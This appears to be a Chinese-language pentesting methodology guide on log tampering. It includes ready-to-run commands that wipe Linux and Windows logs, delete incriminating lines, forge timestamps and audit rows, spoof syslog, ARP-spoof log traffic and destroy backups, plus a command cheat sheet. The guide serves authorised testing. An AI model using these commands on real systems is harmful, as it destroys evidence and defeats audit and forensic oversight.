# 日志篡改攻击 (Log Tampering Attack)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供日志篡改攻击的系统化方法论，帮助测试人员评估目标系统日志完整性保护机制的有效性，发现日志可被篡改的风险点。

### 1.2 适用范围
本文档适用于以下场景：
- Web 应用日志系统安全测试
- 日志存储完整性评估
- 审计系统有效性验证
- 取证抗抵赖能力测试

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 安全运营分析师
- 合规性评估人员

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志篡改攻击是指攻击者通过修改、删除或伪造日志记录，破坏日志的完整性和可信度，从而隐藏攻击痕迹、误导调查方向或破坏取证分析的攻击技术。

**核心原理：**
- **日志存储权限缺陷**：日志文件或数据库权限配置不当，允许未授权访问
- **日志传输无保护**：日志传输过程未加密或未签名，可被中间人篡改
- **日志系统漏洞**：日志软件本身存在漏洞，可被利用进行篡改
- **审计机制缺失**：缺乏对日志访问和修改的二次审计

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **本地日志文件** | /var/log/ 目录 | 文件权限配置不当，允许写入 |
| **数据库日志表** | audit_log 表 | SQL 注入可直接修改日志 |
| **日志管理界面** | 日志查看/导出功能 | 未授权访问或权限提升 |
| **SIEM 系统** | Splunk、ELK 界面 | 弱凭证或配置错误 |
| **云日志服务** | CloudWatch、Stackdriver | IAM 权限配置错误 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**日志文件权限探测：**
```bash
# 检测日志文件是否可写
ls -la /var/log/
# 尝试写入测试
echo "test" >> /var/log/application.log

# 检测日志目录权限
ls -ld /var/log/
# 尝试创建文件
touch /var/log/test.log
```

**日志管理接口探测：**
```bash
# 探测日志查看接口
GET /admin/logs
GET /api/v1/logs
GET /logs?action=view

# 探测日志删除接口
DELETE /admin/logs?id=123
POST /api/v1/logs/delete -d '{"ids":[1,2,3]}'

# 探测日志修改接口
PUT /admin/logs/123 -d '{"content":"modified"}'
POST /api/v1/logs/edit -d '{"id":123,"content":"modified"}'
```

**日志注入点探测：**
```bash
# 测试日志内容是否可注入
curl "http://target/login?user=admin'--" 
# 检查日志中是否记录了未转义的内容

# 测试换行符注入（日志注入攻击）
curl -d "username=admin%0a2024-01-01%20INFO%20Fake%20log%20entry" "http://target/login"
```

#### 2.3.2 白盒测试

**代码审计要点：**
```java
// 危险模式：日志内容包含未过滤的用户输入
logger.info("User login: " + userInput);

// 危险模式：日志文件路径包含用户输入
File logFile = new File("/var/log/" + userProvidedName + ".log");

// 危险模式：日志删除操作无权限检查
public void deleteLog(String logId) {
    logRepository.deleteById(logId);  // 无权限检查
}

// 危险模式：日志数据库使用动态 SQL
String sql = "UPDATE audit_log SET content='" + newContent + "' WHERE id=" + logId;
```

**配置审计要点：**
```bash
# 检查日志文件权限
find /var/log -type f -perm -002  # 查找全局可写文件
find /var/log -type f -perm -020  # 查找组可写文件

# 检查日志数据库权限
# MySQL 示例
SHOW GRANTS FOR 'loguser'@'localhost';
```

### 2.4 漏洞利用方法

#### 2.4.1 直接文件篡改

**Linux 系统日志篡改：**
```bash
# 如果有写权限，直接修改
echo "" > /var/log/auth.log  # 清空日志
sed -i '/suspicious_activity/d' /var/log/syslog  # 删除特定行

# 修改时间戳
touch -t 202401010000 /var/log/application.log

# 替换敏感内容
sed -i 's/attacker_ip/127.0.0.1/g' /var/log/access.log
```

**Windows 系统日志篡改：**
```powershell
# 清空事件日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 使用 PowerShell 删除特定事件
$logs = Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}
# 需要特殊权限才能删除单个事件
```

#### 2.4.2 数据库日志篡改

**SQL 注入篡改日志：**
```sql
-- 如果日志存储存在 SQL 注入
-- 修改特定日志条目
UPDATE audit_log SET action='normal_query' WHERE action='sql_injection_attempt';

-- 删除攻击相关日志
DELETE FROM audit_log WHERE ip_address='attacker_ip';

-- 插入虚假日志
INSERT INTO audit_log (timestamp, user, action, ip) 
VALUES ('2024-01-01 00:00:00', 'admin', 'system_maintenance', '127.0.0.1');
```

**时间顺序混淆：**
```sql
-- 修改时间戳打乱调查顺序
UPDATE audit_log SET timestamp=timestamp + INTERVAL 1 HOUR 
WHERE timestamp BETWEEN '2024-01-01' AND '2024-01-02';
```

#### 2.4.3 日志管理界面利用

**未授权访问：**
```bash
# 尝试访问日志管理界面
curl "http://target/admin/logs"
curl "http://target/api/logs?action=delete&id=1"

# 尝试默认凭证
curl -u "admin:admin" "http://target/admin/logs/delete/all"
curl -u "loguser:logpass" "http://target/api/logs/clear"
```

**权限提升：**
```bash
# 尝试越权操作
# 普通用户尝试删除所有日志
curl -X POST "http://target/api/logs/delete" \
     -H "Authorization: Bearer $USER_TOKEN" \
     -d '{"filter":"all"}'

# 修改请求中的用户 ID 参数
curl "http://target/api/logs?user_id=1"  # 尝试访问管理员日志
```

#### 2.4.4 日志传输篡改

**中间人攻击：**
```bash
# 如果日志传输未加密（如 syslog over UDP）
# 使用 Ettercap 或 Bettercap 拦截
ettercap -M arp /target/ /gateway/ // udp/514

# 伪造日志消息
echo "<14>Jan  1 00:00:00 server1 FakeLog: System restarted" | nc -u syslog_server 514
```

**日志重放攻击：**
```bash
# 捕获合法日志消息并重复发送
tcpdump -i eth0 -s 0 -w syslog_capture.pcap port 514

# 重放捕获的日志（使用正常日志淹没异常检测）
tcpreplay -i eth0 syslog_capture.pcap
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过日志完整性检查

**哈希校验绕过：**
```bash
# 如果系统使用简单的哈希校验
# 1. 获取当前日志哈希
md5sum /var/log/auth.log

# 2. 修改日志
echo "" >> /var/log/auth.log

# 3. 重新计算并替换哈希（如果哈希存储在同一位置）
# 这需要能够同时修改日志和哈希存储
```

**签名绕过：**
```bash
# 如果日志签名实现不当
# 1. 找到签名密钥（可能在配置文件中）
grep -r "signing_key" /etc/

# 2. 使用找到的密钥重新签名修改后的日志
# 或使用弱密钥生成工具
```

#### 2.5.2 绕过备份恢复机制

```bash
# 同时删除或修改备份日志
rm -f /var/log/*.log.*
rm -f /backup/logs/*.log

# 修改备份配置防止恢复
echo "" > /etc/logrotate.d/application

# 攻击远程日志服务器
# 如果知道远程服务器地址，同时攻击
ssh compromised_server "rm /var/log/remote_logs/target.log"
```

#### 2.5.3 时间线混淆技术

```bash
# 修改文件时间戳混淆调查
touch -d "2024-01-01 00:00:00" /var/log/application.log

# 批量修改日志时间
for log in /var/log/*.log; do
    touch -d "2024-06-15 12:00:00" $log
done

# 创建虚假时间线
echo "2024-01-01 00:00:00 Normal operation" >> /var/log/fake.log
echo "2024-01-02 00:00:00 System maintenance" >> /var/log/fake.log
```

---

## 第三部分：附录

### 3.1 日志篡改检测清单

| **检查项** | **检测方法** | **风险等级** |
| :--- | :--- | :--- |
| 日志文件权限 | `ls -la /var/log/` | 高 |
| 日志数据库权限 | 检查 DB 用户权限 | 高 |
| 日志传输加密 | 抓包分析 | 中 |
| 日志完整性校验 | 检查哈希/签名机制 | 中 |
| 日志备份机制 | 检查备份配置 | 中 |
| 二次审计日志 | 检查日志访问记录 | 低 |

### 3.2 常用日志篡改命令速查表

| **目标** | **Linux 命令** | **Windows 命令** |
| :--- | :--- | :--- |
| 清空日志 | `echo "" > /var/log/file.log` | `wevtutil cl Security` |
| 删除特定行 | `sed -i '/pattern/d' file.log` | PowerShell 过滤 |
| 修改时间戳 | `touch -t 202401010000 file.log` | `powershell (Get-Item file).LastWriteTime=...` |
| 替换内容 | `sed -i 's/old/new/g' file.log` | `(gc file) -replace 'old','new' \| sc file` |

### 3.3 参考资源

- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Cheat_Sheet.html)
- [MITRE ATT&CK - Indicator Removal: Event Log](https://attack.mitre.org/techniques/T1070/001/)
- [NIST 800-92 Guide to Computer Security Log Management](https://csrc.nist.gov/publications/detail/sp/800-92/final)
- [SANS Log Management Best Practices](https://www.sans.org/blog/log-management-best-practices/)
